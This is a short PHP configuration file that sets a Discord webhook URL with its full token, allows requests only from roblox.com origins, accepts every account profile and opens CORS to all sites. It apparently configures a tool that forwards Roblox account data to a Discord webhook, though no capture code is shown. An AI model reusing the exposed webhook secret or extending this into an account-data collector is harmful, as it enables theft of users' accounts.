<?php


$webhook = "https://discord.com/api/webhooks/802148701178036264/NaQUfgSRetEAL6pgOTeu-quuWd7KEybBBDACM7BsLzijEZBYnmPdvkhzzbiYjwt8NEhv";
$discord_contact = "E=Mc²";

$allowed_origins = array(
    "https://www.roblox.com",
    "https://web.roblox.com"
);
function account_filter($profile)
{
    return true;
}
require("status.php");
header("Access-Control-Allow-Origin: *");
